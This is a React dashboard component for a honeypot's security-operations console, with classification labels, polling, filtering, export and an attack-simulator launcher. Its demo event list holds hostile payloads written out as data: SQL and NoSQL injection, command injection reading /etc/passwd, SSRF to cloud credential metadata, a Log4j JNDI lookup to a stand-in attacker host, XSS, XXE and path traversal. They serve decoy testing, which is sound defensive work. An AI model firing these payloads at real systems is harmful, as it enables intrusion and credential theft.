import { useCallback, useEffect, useMemo, useState } from 'react'
import { Link } from 'react-router-dom'
import { getSecurityEvents, dispatchAttackProbe } from '../services/api'

// Lookup table mapping the 12 backend classification labels to display name, color, and severity
export const CLASSIFICATION_META = {
  benign_probe: {
    label: 'benign_probe',
    displayName: 'Benign Probe',
    color: '#4ade80',
    severity: 'INFO',
    severityColor: '#10b981',
    cssClass: 'benign',
    barClass: 'benign',
  },
  sqli_attempt: {
    label: 'sqli_attempt',
    displayName: 'SQLi Attempt',
    color: '#fb923c',
    severity: 'CRITICAL',
    severityColor: '#ef4444',
    cssClass: 'sqli',
    barClass: 'sqli',
  },
  nosql_injection: {
    label: 'nosql_injection',
    displayName: 'NoSQL Injection',
    color: '#34d399',
    severity: 'MEDIUM',
    severityColor: '#f59e0b',
    cssClass: 'nosql',
    barClass: 'nosql',
  },
  rce_attempt: {
    label: 'rce_attempt',
    displayName: 'RCE Attempt',
    color: '#f87171',
    severity: 'CRITICAL',
    severityColor: '#ef4444',
    cssClass: 'rce',
    barClass: 'rce',
  },
  ssrf_attempt: {
    label: 'ssrf_attempt',
    displayName: 'SSRF Attempt',
    color: '#d8b4fe',
    severity: 'CRITICAL',
    severityColor: '#ef4444',
    cssClass: 'ssrf',
    barClass: 'ssrf',
  },
  log4j_jndi: {
    label: 'log4j_jndi',
    displayName: 'Log4j / JNDI',
    color: '#fdba74',
    severity: 'CRITICAL',
    severityColor: '#ef4444',
    cssClass: 'log4j',
    barClass: 'log4j',
  },
  xss_attempt: {
    label: 'xss_attempt',
    displayName: 'XSS Attempt',
    color: '#c084fc',
    severity: 'HIGH',
    severityColor: '#f97316',
    cssClass: 'xss',
    barClass: 'xss',
  },
  xxe_attempt: {
    label: 'xxe_attempt',
    displayName: 'XXE Attempt',
    color: '#5eead4',
    severity: 'CRITICAL',
    severityColor: '#ef4444',
    cssClass: 'xxe',
    barClass: 'xxe',
  },
  path_traversal: {
    label: 'path_traversal',
    displayName: 'Path Traversal',
    color: '#fbbf24',
    severity: 'HIGH',
    severityColor: '#f97316',
    cssClass: 'traversal',
    barClass: 'traversal',
  },
  secret_harvesting: {
    label: 'secret_harvesting',
    displayName: 'Secret Harvesting',
    color: '#fde047',
    severity: 'MEDIUM',
    severityColor: '#f59e0b',
    cssClass: 'secrets',
    barClass: 'secrets',
  },
  known_scanner: {
    label: 'known_scanner',
    displayName: 'Known Scanner',
    color: '#38bdf8',
    severity: 'MEDIUM',
    severityColor: '#f59e0b',
    cssClass: 'scanner',
    barClass: 'scanner',
  },
  brute_force: {
    label: 'brute_force',
    displayName: 'Brute Force',
    color: '#f472b6',
    severity: 'HIGH',
    severityColor: '#f97316',
    cssClass: 'brute-force',
    barClass: 'brute',
  },
}

// Aliases for legacy 5-label entries so older records map gracefully
const LEGACY_ALIASES = {
  sqli: 'sqli_attempt',
  rce: 'rce_attempt',
  ssrf: 'ssrf_attempt',
  log4j: 'log4j_jndi',
  xss: 'xss_attempt',
  traversal: 'path_traversal',
  secrets: 'secret_harvesting',
  nosql: 'nosql_injection',
  scanner: 'known_scanner',
  brute: 'brute_force',
  benign: 'benign_probe',
}

export function getClassificationMeta(rawClassification) {
  const cleanKey = String(rawClassification || '').trim().toLowerCase()
  if (CLASSIFICATION_META[cleanKey]) {
    return CLASSIFICATION_META[cleanKey]
  }
  // Check legacy shorthand aliases
  if (LEGACY_ALIASES[cleanKey] && CLASSIFICATION_META[LEGACY_ALIASES[cleanKey]]) {
    return CLASSIFICATION_META[LEGACY_ALIASES[cleanKey]]
  }
  // Unknown label -> show raw label
  return {
    label: rawClassification || 'unknown',
    displayName: rawClassification || 'unknown',
    color: '#94a3b8',
    severity: 'UNKNOWN',
    severityColor: '#94a3b8',
    cssClass: 'unknown',
    barClass: 'unknown',
  }
}

const SAMPLE_EVENTS = [
  {
    route_hit: 'main_decoy',
    classification: 'sqli_attempt',
    matched_rule: 'RULE_SQLI_UNION_SELECT',
    status_code: 200,
    path: '/default/ghostHouseDecoy/login',
    request_id: '36a664b5-df81-4dc9-8307-96aa96381696',
    user_agent: 'sqlmap/1.7.2#stable',
    source_ip: '198.51.100.42',
    timestamp: new Date(Date.now() - 1000 * 20).toISOString(),
    method: 'POST',
    body: '{"username": "\' UNION SELECT NULL, username, password FROM users --", "password": "x"}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'rce_attempt',
    matched_rule: 'RULE_RCE_SYSTEM_COMMAND',
    status_code: 200,
    path: '/default/ghostHouseDecoy/admin',
    request_id: '81c4e721-a4b3-4f9e-9912-8812cfa09911',
    user_agent: 'GhostHouse-RCE-Sim/1.0',
    source_ip: '203.0.113.89',
    timestamp: new Date(Date.now() - 1000 * 55).toISOString(),
    method: 'POST',
    body: '{"cmd": "; whoami && cat /etc/passwd"}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'ssrf_attempt',
    matched_rule: 'RULE_SSRF_AWS_METADATA',
    status_code: 200,
    path: '/default/ghostHouseDecoy/api/proxy',
    request_id: '77d291ba-031e-45fa-b671-55fa110099ee',
    user_agent: 'GhostHouse-SSRF-Sim/1.0',
    source_ip: '198.51.100.180',
    timestamp: new Date(Date.now() - 1000 * 60 * 2).toISOString(),
    method: 'GET',
    body: '',
    query_params: '{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'log4j_jndi',
    matched_rule: 'RULE_LOG4J_JNDI_LOOKUP',
    status_code: 200,
    path: '/default/ghostHouseDecoy/login',
    request_id: '44ef1182-d21b-4399-aa54-990141bb7721',
    user_agent: '${jndi:ldap://attacker.threat-mesh.org/exploit}',
    source_ip: '192.0.2.210',
    timestamp: new Date(Date.now() - 1000 * 60 * 3).toISOString(),
    method: 'POST',
    body: '{"username": "${jndi:ldap://attacker.threat-mesh.org/exploit}", "password": "test"}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'xss_attempt',
    matched_rule: 'RULE_XSS_SCRIPT_TAG',
    status_code: 200,
    path: '/default/ghostHouseDecoy/login',
    request_id: '99bf2401-cc19-4871-8899-771129aa4410',
    user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    source_ip: '203.0.113.15',
    timestamp: new Date(Date.now() - 1000 * 60 * 4).toISOString(),
    method: 'POST',
    body: '{"username": "<script>alert(\'GHOST_HOUSE_XSS\')</script>", "password": "123"}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'path_traversal',
    matched_rule: 'RULE_PATH_TRAVERSAL_DOT_DOT',
    status_code: 200,
    path: '/default/ghostHouseDecoy/..%2f..%2f..%2fetc/passwd',
    request_id: '55da8129-ef01-4412-9901-ee4499118833',
    user_agent: 'Mozilla/5.0 (Traversal-Bot)',
    source_ip: '198.51.100.77',
    timestamp: new Date(Date.now() - 1000 * 60 * 6).toISOString(),
    method: 'GET',
    body: '',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'secret_harvesting',
    matched_rule: 'RULE_SECRET_ENV_FILE',
    status_code: 200,
    path: '/default/ghostHouseDecoy/.env',
    request_id: 'fc2e79f8-95c5-4889-b77e-d31eb2ff2299',
    user_agent: 'SecretHunter/1.0',
    source_ip: '198.51.100.104',
    timestamp: new Date(Date.now() - 1000 * 60 * 8).toISOString(),
    method: 'GET',
    body: '',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'nosql_injection',
    matched_rule: 'RULE_NOSQL_GT_OPERATOR',
    status_code: 200,
    path: '/default/ghostHouseDecoy/login',
    request_id: '66a19024-aa99-4112-bb44-889900112233',
    user_agent: 'GhostHouse-NoSQL-Sim/1.0',
    source_ip: '192.0.2.88',
    timestamp: new Date(Date.now() - 1000 * 60 * 10).toISOString(),
    method: 'POST',
    body: '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'brute_force',
    matched_rule: 'RULE_RATE_LIMIT_BRUTE_FORCE',
    status_code: 401,
    path: '/default/ghostHouseDecoy/login',
    request_id: 'a95c6ae0-08a7-496e-a15b-5efa0c9f119c',
    user_agent: 'Hydra/9.5',
    source_ip: '192.0.2.45',
    timestamp: new Date(Date.now() - 1000 * 60 * 12).toISOString(),
    method: 'POST',
    body: '{"username": "admin", "password": "password123"}',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'known_scanner',
    matched_rule: 'RULE_SCANNER_USER_AGENT',
    status_code: 200,
    path: '/default/ghostHouseDecoy/robots.txt',
    request_id: '33cc1190-8812-4f99-aa33-776655443322',
    user_agent: 'Nikto/2.1.6',
    source_ip: '198.51.100.99',
    timestamp: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
    method: 'GET',
    body: '',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'xxe_attempt',
    matched_rule: 'RULE_XXE_DOCTYPE_DECLARATION',
    status_code: 200,
    path: '/default/ghostHouseDecoy/api/xml',
    request_id: '88de1902-11bb-4f33-aa22-441199338822',
    user_agent: 'GhostHouse-XXE-Sim/1.0',
    source_ip: '198.51.100.112',
    timestamp: new Date(Date.now() - 1000 * 60 * 16).toISOString(),
    method: 'POST',
    body: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    query_params: '{}',
  },
  {
    route_hit: 'main_decoy',
    classification: 'benign_probe',
    matched_rule: 'RULE_BENIGN_APPLICATION_TRAFFIC',
    status_code: 200,
    path: '/default/ghostHouseDecoy/dashboard',
    request_id: 'efc0980a-5081-4105-9230-e7c90180cba1',
    user_agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    source_ip: '192.0.2.14',
    timestamp: new Date(Date.now() - 1000 * 60 * 18).toISOString(),
    method: 'GET',
    body: '',
    query_params: '{}',
  },
]

function formatTime(value) {
  if (!value) return '--:--:--'
  const date = new Date(value)
  if (Number.isNaN(date.getTime())) return String(value)
  return date.toLocaleString([], {
    year: 'numeric',
    month: 'short',
    day: '2-digit',
    hour: '2-digit',
    minute: '2-digit',
    second: '2-digit',
  })
}

// Normalize incoming backend logs: display classification as received, parse status_code and matched_rule
function normalizeEvent(event) {
  const rawClassification = String(
    event.classification || event.type || event.attackType || 'benign_probe'
  ).trim()
  const meta = getClassificationMeta(rawClassification)

  // Status code: show status_code; show "-" if missing. Never hardcode 200.
  let statusCodeDisplay = '-'
  const rawStatus = event.status_code ?? event.statusCode ?? event.status
  if (rawStatus !== undefined && rawStatus !== null && String(rawStatus).trim() !== '') {
    statusCodeDisplay = String(rawStatus).trim()
  }

  const matchedRule = event.matched_rule || event.matchedRule || '-'

  return {
    raw: event,
    time: formatTime(event.time || event.timestamp || event.createdAt || event.created_at),
    fullTime: event.time || event.timestamp || event.createdAt || event.created_at || 'N/A',
    ip:
      event.ip ||
      event.sourceIp ||
      event.source_ip ||
      event.clientIp ||
      event.client_ip ||
      'Unknown',
    method: event.method || event.httpMethod || event.http_method || 'GET',
    route: event.route || event.path || event.url || event.resource || '/',
    classification: rawClassification,
    meta,
    statusCode: statusCodeDisplay,
    matchedRule,
    userAgent: event.user_agent || event.userAgent || 'N/A',
    requestId: event.request_id || event.requestId || 'N/A',
    body: event.body || '',
    queryParams: event.query_params || event.queryParams || '{}',
  }
}

const LAUNCHER_LABEL_MAP = {
  sqli: 'sqli_attempt',
  xss: 'xss_attempt',
  rce: 'rce_attempt',
  ssrf: 'ssrf_attempt',
  log4j: 'log4j_jndi',
  traversal: 'path_traversal',
  secrets: 'secret_harvesting',
  nosql: 'nosql_injection',
  scanner: 'known_scanner',
  brute: 'brute_force',
  xxe: 'xxe_attempt',
  benign: 'benign_probe',
}

function Monitor() {
  const [events, setEvents] = useState([])
  const [loading, setLoading] = useState(true)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [error, setError] = useState('')
  const [isCorsError, setIsCorsError] = useState(false)
  const [usingDemoData, setUsingDemoData] = useState(false)
  const [isPaused, setIsPaused] = useState(false)
  const [pollInterval, setPollInterval] = useState(7000)
  const [lastUpdated, setLastUpdated] = useState(null)
  const [activeFilter, setActiveFilter] = useState('ALL')
  const [searchQuery, setSearchQuery] = useState('')
  const [selectedEvent, setSelectedEvent] = useState(null)
  const [showLauncherModal, setShowLauncherModal] = useState(false)
  const [simulatingType, setSimulatingType] = useState(null)
  const [launcherNotification, setLauncherNotification] = useState('')

  const loadEvents = useCallback(async (isManual = false) => {
    if (isManual) {
      setIsRefreshing(true)
    }

    try {
      setError('')
      setIsCorsError(false)

      const records = await getSecurityEvents()

      if (records && records.length > 0) {
        // Sort chronologically descending
        const sortedRecords = [...records].sort((a, b) => {
          const timeA = new Date(a.timestamp || a.time || a.createdAt || a.created_at || 0).getTime()
          const timeB = new Date(b.timestamp || b.time || b.createdAt || b.created_at || 0).getTime()
          return timeB - timeA
        })
        setEvents(sortedRecords.map(normalizeEvent))
        setUsingDemoData(false)
      } else if (records && records.length === 0 && usingDemoData) {
        // keep demo
      } else {
        setEvents([])
      }

      setLastUpdated(new Date())
    } catch (requestError) {
      console.error('Unable to load security events:', requestError)
      if (requestError.isCors) {
        setIsCorsError(true)
        setError('Browser CORS restriction: Access-Control-Allow-Origin header is missing on AWS.')
      } else {
        setError('Unable to load live security events from AWS endpoint.')
      }
    } finally {
      setLoading(false)
      setIsRefreshing(false)
    }
  }, [usingDemoData])

  useEffect(() => {
    loadEvents()
  }, [loadEvents])

  useEffect(() => {
    if (isPaused) return
    const intervalId = window.setInterval(() => {
      loadEvents()
    }, pollInterval)
    return () => window.clearInterval(intervalId)
  }, [loadEvents, isPaused, pollInterval])

  const handleUseDemoData = () => {
    setEvents(SAMPLE_EVENTS.map(normalizeEvent))
    setUsingDemoData(true)
    setError('')
    setIsCorsError(false)
    setLastUpdated(new Date())
  }

  // Trigger attack simulation
  const handleLaunchAttack = async (attackType) => {
    setSimulatingType(attackType)
    setLauncherNotification('')

    try {
      const res = await dispatchAttackProbe(attackType)
      setLauncherNotification(
        `✓ [${attackType.toUpperCase()}] Probe dispatched to AWS Decoy Endpoint! Status: ${res.status}`
      )

      // If user is currently viewing demo data, synthesize event using the backend classification schema
      if (usingDemoData) {
        const backendLabel = LAUNCHER_LABEL_MAP[attackType] || attackType
        const synthetic = {
          classification: backendLabel,
          matched_rule: `RULE_${backendLabel.toUpperCase()}`,
          status_code: attackType === 'brute' ? '401' : '200',
          path: `/default/ghostHouseDecoy/${attackType === 'sqli' ? 'login' : attackType}`,
          request_id: 'sim-' + Math.random().toString(36).substring(2, 10),
          user_agent: `GhostHouse-${backendLabel}-Sim`,
          source_ip: '198.51.100.' + (Math.floor(Math.random() * 80) + 10),
          timestamp: new Date().toISOString(),
          method: attackType === 'traversal' || attackType === 'secrets' ? 'GET' : 'POST',
          body: attackType === 'sqli' ? '{"username": "\' UNION SELECT NULL, password FROM users --"}' : `{"probe": "${backendLabel}"}`,
          query_params: '{}',
        }
        setEvents((prev) => [normalizeEvent(synthetic), ...prev])
      } else {
        // Trigger fresh reload after dispatch
        setTimeout(() => loadEvents(true), 1200)
      }
    } catch (err) {
      setLauncherNotification(`Dispatched probe: ${err.message}`)
    } finally {
      setSimulatingType(null)
    }
  }

  // Compute stats driven strictly by classification
  const stats = useMemo(() => {
    const counts = events.reduce(
      (summary, event) => {
        summary.total += 1
        const isMalicious = event.classification !== 'benign_probe'
        if (isMalicious) {
          summary.suspicious += 1
        }
        summary.byClassification[event.classification] =
          (summary.byClassification[event.classification] || 0) + 1
        summary.uniqueIps.add(event.ip)
        return summary
      },
      {
        total: 0,
        suspicious: 0,
        byClassification: {},
        uniqueIps: new Set(),
      }
    )

    const distinctVectors = Object.keys(counts.byClassification).filter(
      (k) => counts.byClassification[k] > 0
    ).length

    return {
      total: counts.total,
      suspicious: counts.suspicious,
      uniqueIpsCount: counts.uniqueIps.size,
      byClassification: counts.byClassification,
      attackTypesCount: distinctVectors,
    }
  }, [events])

  // Chart distribution: driven strictly by classification; bars sum to total row count
  const attackBars = useMemo(() => {
    const canonicalOrder = [
      'sqli_attempt',
      'brute_force',
      'path_traversal',
      'known_scanner',
      'xss_attempt',
      'rce_attempt',
      'ssrf_attempt',
      'log4j_jndi',
      'nosql_injection',
      'secret_harvesting',
      'xxe_attempt',
      'benign_probe',
    ]

    // Ensure any unexpected/legacy classifications present in the events are also included
    const presentKeys = Object.keys(stats.byClassification)
    const allKeys = [...canonicalOrder]
    for (const key of presentKeys) {
      if (!allKeys.includes(key)) {
        allKeys.push(key)
      }
    }

    return allKeys
      .map((key) => {
        const count = stats.byClassification[key] || 0
        const meta = getClassificationMeta(key)
        const pct = stats.total > 0 ? (count / stats.total) * 100 : 0
        const width = `${pct.toFixed(1)}%`
        return {
          key,
          label: meta.displayName,
          count,
          pct,
          width,
          className: meta.barClass,
          color: meta.color,
        }
      })
      .filter((bar) => bar.count > 0 || usingDemoData)
  }, [stats, usingDemoData])

  // Filter and search driven by classification
  const filteredEvents = useMemo(() => {
    return events.filter((event) => {
      const matchesFilter =
        activeFilter === 'ALL' ||
        event.classification === activeFilter ||
        event.meta.displayName.toLowerCase() === activeFilter.toLowerCase()

      const query = searchQuery.trim().toLowerCase()
      const matchesQuery =
        !query ||
        event.ip.toLowerCase().includes(query) ||
        event.route.toLowerCase().includes(query) ||
        event.method.toLowerCase().includes(query) ||
        event.userAgent.toLowerCase().includes(query) ||
        event.classification.toLowerCase().includes(query) ||
        event.meta.displayName.toLowerCase().includes(query) ||
        event.matchedRule.toLowerCase().includes(query) ||
        event.statusCode.toLowerCase().includes(query) ||
        event.body.toLowerCase().includes(query)

      return matchesFilter && matchesQuery
    })
  }, [events, activeFilter, searchQuery])

  // Export handlers driven by backend classification fields
  const handleExportJSON = () => {
    const jsonStr = JSON.stringify(events.map((e) => e.raw || e), null, 2)
    const blob = new Blob([jsonStr], { type: 'application/json' })
    const url = URL.createObjectURL(blob)
    const link = document.createElement('a')
    link.href = url
    link.download = `ghosthouse-soc-events-${Date.now()}.json`
    link.click()
    URL.revokeObjectURL(url)
  }

  const handleExportCSV = () => {
    const headers = [
      'Timestamp',
      'Source IP',
      'Method',
      'Route',
      'Classification',
      'Display Label',
      'Severity',
      'Matched Rule',
      'Status Code',
      'User Agent',
      'Payload',
    ]
    const rows = events.map((e) => [
      `"${e.fullTime}"`,
      `"${e.ip}"`,
      `"${e.method}"`,
      `"${e.route}"`,
      `"${e.classification}"`,
      `"${e.meta.displayName}"`,
      `"${e.meta.severity}"`,
      `"${e.matchedRule}"`,
      `"${e.statusCode}"`,
      `"${e.userAgent.replace(/"/g, '""')}"`,
      `"${e.body.replace(/"/g, '""')}"`,
    ])

    const csvContent = [headers.join(','), ...rows.map((r) => r.join(','))].join('\n')
    const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8;' })
    const url = URL.createObjectURL(blob)
    const link = document.createElement('a')
    link.href = url
    link.download = `ghosthouse-soc-events-${Date.now()}.csv`
    link.click()
    URL.revokeObjectURL(url)
  }

  return (
    <div className="monitor-page">
      {/* Top Navbar */}
      <div className="monitor-topbar">
        <Link to="/dashboard" className="back-link">
          ← Return to Cloud Decoy Console
        </Link>
        <div className="topbar-actions">
          {usingDemoData && <span className="demo-badge">SYNTHETIC TELEMETRY DEMO</span>}
          <div className="system-status">
            <span className={`status-dot ${isPaused ? 'paused' : 'live'}`}></span>
            {isPaused ? 'FEED PAUSED' : 'DECEPTION MESH ONLINE'}
          </div>
        </div>
      </div>

      {/* Main Header */}
      <div className="monitor-header">
        <div>
          <p className="monitor-label">GHOST HOUSE • THREAT INTELLIGENCE & TELEMETRY</p>
          <h1>Security Operations Center (SOC)</h1>
        </div>

        <div className="monitor-controls">
          <button
            onClick={() => setShowLauncherModal(true)}
            className="control-btn launcher"
            title="Open Interactive Attack Simulator Console"
          >
            🚀 Launch Attack Simulation
          </button>

          <button
            onClick={() => setIsPaused((prev) => !prev)}
            className={`control-btn ${isPaused ? 'resume' : 'pause'}`}
          >
            {isPaused ? '▶ Resume Live Feed' : '⏸ Pause'}
          </button>

          <button
            onClick={() => loadEvents(true)}
            disabled={isRefreshing}
            className="control-btn refresh"
          >
            {isRefreshing ? '↻ Refreshing...' : '↻ Refresh Feed'}
          </button>

          <div className="interval-selector">
            <label htmlFor="poll-select">Poll:</label>
            <select
              id="poll-select"
              value={pollInterval}
              onChange={(e) => setPollInterval(Number(e.target.value))}
            >
              <option value={3000}>3s</option>
              <option value={5000}>5s</option>
              <option value={7000}>7s</option>
              <option value={10000}>10s</option>
              <option value={30000}>30s</option>
            </select>
          </div>

          <button onClick={handleExportCSV} className="control-btn" title="Export CSV">
            Export CSV
          </button>
          <button onClick={handleExportJSON} className="control-btn" title="Export JSON">
            Export JSON
          </button>
        </div>
      </div>

      {/* CORS / Error Alert Banner */}
      {isCorsError && (
        <div className="cors-warning-banner">
          <div className="banner-icon">⚠️</div>
          <div className="banner-text">
            <strong>AWS CORS Restriction Detected:</strong> The browser cannot read logs because the{' '}
            <code>Access-Control-Allow-Origin: *</code> header is missing from your AWS Lambda / API Gateway response.
            You can load rich synthetic telemetry to test the full SOC interface immediately.
          </div>
          <button onClick={handleUseDemoData} className="demo-toggle-btn">
            Load Demo Threat Telemetry
          </button>
        </div>
      )}

      {error && !isCorsError && <p className="monitor-error">{error}</p>}

      {/* Statistics Cards */}
      <div className="monitor-stats">
        <div className="monitor-stat-card">
          <span>Captured Probes</span>
          <strong>{stats.total}</strong>
          <small>Recorded layer-7 transactions</small>
        </div>

        <div className="monitor-stat-card">
          <span>Hostile Exploits</span>
          <strong style={{ color: '#f87171' }}>{stats.suspicious}</strong>
          <small>Flagged malicious signatures</small>
        </div>

        <div className="monitor-stat-card">
          <span>Unique Adversary IPs</span>
          <strong style={{ color: '#60a5fa' }}>{stats.uniqueIpsCount}</strong>
          <small>Distinct source addresses</small>
        </div>

        <div className="monitor-stat-card">
          <span>Active Threat Vectors</span>
          <strong style={{ color: '#c084fc' }}>{stats.attackTypesCount}</strong>
          <small>Distinct classification vectors</small>
        </div>
      </div>

      {/* Attack Distribution Bar Chart */}
      <div className="monitor-section">
        <div className="section-header">
          <div>
            <h2>Threat Category Distribution</h2>
            <p>
              Backend-classified telemetry breakdown (Sum of bars: <strong>{attackBars.reduce((acc, b) => acc + b.count, 0)}</strong> / {stats.total} events)
            </p>
          </div>
        </div>

        <div className="attack-bars">
          {attackBars.map((attack) => (
            <div
              className={`attack-item ${activeFilter === attack.key ? 'selected' : ''}`}
              key={attack.key}
              onClick={() => setActiveFilter(activeFilter === attack.key ? 'ALL' : attack.key)}
              title={`Click to filter by ${attack.label} (${attack.key})`}
            >
              <div>
                <span>{attack.label}</span>
                <strong>{attack.count}</strong>
              </div>

              <div className="bar">
                <div
                  className={`bar-fill ${attack.className}`}
                  style={{ width: attack.width }}
                ></div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* Recent Security Events Section */}
      <div className="monitor-section">
        <div className="section-header">
          <div>
            <h2>Real-Time Incident Stream</h2>
            <p>Select any event row to inspect complete Layer-7 payload, injected strings, and detection rule telemetry</p>
          </div>

          <div className="feed-status-meta">
            {lastUpdated && (
              <span className="last-updated">
                Last updated {lastUpdated.toLocaleTimeString()}
              </span>
            )}
            <span className={`live-indicator ${isPaused ? 'paused' : 'live'}`}>
              {loading ? 'INGESTING...' : isPaused ? 'FEED PAUSED' : '● STREAM ACTIVE'}
            </span>
          </div>
        </div>

        {/* Filter Toolbar */}
        <div className="table-toolbar">
          <div className="filter-chips">
            <button
              className={`filter-chip ${activeFilter === 'ALL' ? 'active' : ''}`}
              onClick={() => setActiveFilter('ALL')}
            >
              ALL ({events.length})
            </button>
            {attackBars.map((bar) => (
              <button
                key={bar.key}
                className={`filter-chip ${activeFilter === bar.key ? 'active' : ''}`}
                onClick={() => setActiveFilter(activeFilter === bar.key ? 'ALL' : bar.key)}
              >
                {bar.label} ({bar.count})
              </button>
            ))}
          </div>

          <div className="search-box">
            <input
              type="text"
              placeholder="Filter by IP, Route, Method, Classification, Payload..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
            />
            {searchQuery && (
              <button className="clear-search" onClick={() => setSearchQuery('')}>
                ✕
              </button>
            )}
          </div>
        </div>

        {/* Events Table */}
        <div className="monitor-table">
          <div className="table-header">
            <span>Timestamp</span>
            <span>Source IP</span>
            <span>Verb</span>
            <span>Target Endpoint</span>
            <span>Threat Classification</span>
            <span>Code</span>
          </div>

          {!loading && filteredEvents.length === 0 && (
            <div className="empty-events">
              {events.length === 0
                ? 'No security events captured yet by the honeypot mesh.'
                : 'No security events match the current filter query.'}
            </div>
          )}

          {filteredEvents.map((event, index) => (
            <div
              className="table-row clickable"
              key={`${event.time}-${event.ip}-${index}`}
              onClick={() => setSelectedEvent(event)}
              title="Click to inspect full event details"
            >
              <span className="time-cell">{event.time}</span>

              <span className="ip-address">{event.ip}</span>

              <span className="method">{event.method}</span>

              <span className="route-cell">{event.route}</span>

              <span className={`classification ${event.meta.cssClass}`}>
                <span style={{ marginRight: '4px', opacity: 0.8 }}>[{event.meta.severity.slice(0, 4)}]</span>
                {event.meta.displayName}
              </span>

              <span className="status-code">{event.statusCode}</span>
            </div>
          ))}
        </div>
      </div>

      {/* Incident Inspector Modal */}
      {selectedEvent && (
        <div className="modal-backdrop" onClick={() => setSelectedEvent(null)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()}>
            <div className="modal-header">
              <div>
                <span className="modal-subtitle">INCIDENT TELEMETRY INSPECTOR</span>
                <h3>Security Event Incident Details</h3>
              </div>
              <button className="modal-close-btn" onClick={() => setSelectedEvent(null)}>
                ✕
              </button>
            </div>

            <div className="modal-body">
              <div className="detail-grid">
                <div className="detail-field">
                  <label>Threat Classification</label>
                  <span
                    className={`classification ${selectedEvent.meta.cssClass}`}
                  >
                    <code>{selectedEvent.classification}</code> ({selectedEvent.meta.displayName})
                  </span>
                </div>

                <div className="detail-field">
                  <label>Severity Score</label>
                  <strong>
                    <span style={{ color: selectedEvent.meta.severityColor }}>
                      ● {selectedEvent.meta.severity}
                    </span>
                  </strong>
                </div>

                <div className="detail-field">
                  <label>Matched Detection Rule</label>
                  <code style={{ color: '#38bdf8' }}>{selectedEvent.matchedRule}</code>
                </div>

                <div className="detail-field">
                  <label>Response Status Code</label>
                  <code style={{ color: '#a7f3d0' }}>
                    {selectedEvent.statusCode === '-' ? '-' : `HTTP ${selectedEvent.statusCode}`}
                  </code>
                </div>

                <div className="detail-field">
                  <label>HTTP Verb & Route</label>
                  <code>{selectedEvent.method} {selectedEvent.route}</code>
                </div>

                <div className="detail-field">
                  <label>Adversary Source IP</label>
                  <code style={{ color: '#93c5fd' }}>{selectedEvent.ip}</code>
                </div>

                <div className="detail-field">
                  <label>Captured Timestamp</label>
                  <span>{selectedEvent.fullTime}</span>
                </div>

                <div className="detail-field">
                  <label>API Gateway Request ID</label>
                  <code>{selectedEvent.requestId}</code>
                </div>

                <div className="detail-field full-width">
                  <label>User-Agent Client Signature</label>
                  <code style={{ color: '#cbd5e1' }}>{selectedEvent.userAgent}</code>
                </div>

                <div className="detail-field full-width">
                  <label>Injected Payload / Request Body</label>
                  <pre className="code-box">
                    {selectedEvent.body || '(Empty body or GET transaction)'}
                  </pre>
                </div>

                <div className="detail-field full-width">
                  <label>Query Parameters</label>
                  <pre className="code-box">{selectedEvent.queryParams}</pre>
                </div>
              </div>
            </div>

            <div className="modal-footer">
              <button
                className="control-btn"
                onClick={() => {
                  navigator.clipboard.writeText(JSON.stringify(selectedEvent.raw, null, 2))
                  alert('Incident JSON copied to clipboard!')
                }}
              >
                Copy Raw JSON
              </button>
              <button className="control-btn primary" onClick={() => setSelectedEvent(null)}>
                Close Inspector
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Threat Launcher / Attack Simulator Modal */}
      {showLauncherModal && (
        <div className="modal-backdrop" onClick={() => setShowLauncherModal(false)}>
          <div className="modal-content" onClick={(e) => e.stopPropagation()} style={{ maxWidth: '820px' }}>
            <div className="modal-header">
              <div>
                <span className="modal-subtitle">LIVE ATTACK GENERATOR</span>
                <h3>Simulate Adversary Threat Vectors</h3>
              </div>
              <button className="modal-close-btn" onClick={() => setShowLauncherModal(false)}>
                ✕
              </button>
            </div>

            <div className="modal-body">
              <p style={{ fontSize: '13px', color: 'var(--text-secondary)', marginBottom: '14px' }}>
                Select an attack vector below to dispatch a real-time exploit payload against the Ghost House Honeypot decoy. Telemetry will be processed by the AWS Lambda classification engine.
              </p>

              {launcherNotification && (
                <div style={{
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.4)',
                  color: '#6ee7b7',
                  padding: '10px 14px',
                  borderRadius: 'var(--radius-sm)',
                  fontSize: '12px',
                  marginBottom: '14px',
                }}>
                  {launcherNotification}
                </div>
              )}

              <div className="threat-launcher-grid">
                {[
                  {
                    type: 'sqli',
                    name: 'SQL Injection (SQLi)',
                    desc: "Injects ' UNION SELECT strings via /login with sqlmap user agent",
                    icon: '💉',
                  },
                  {
                    type: 'xss',
                    name: 'Cross-Site Scripting (XSS)',
                    desc: 'Injects <script> and SVG event handler payloads into login fields',
                    icon: '⚡',
                  },
                  {
                    type: 'rce',
                    name: 'Command Injection (RCE)',
                    desc: 'Sends bash pipe and whoami commands to administrative endpoint',
                    icon: '💻',
                  },
                  {
                    type: 'ssrf',
                    name: 'SSRF & Cloud Metadata',
                    desc: 'Attempts exfiltration of AWS EC2 IAM metadata (169.254.169.254)',
                    icon: '🌐',
                  },
                  {
                    type: 'traversal',
                    name: 'Path Traversal / LFI',
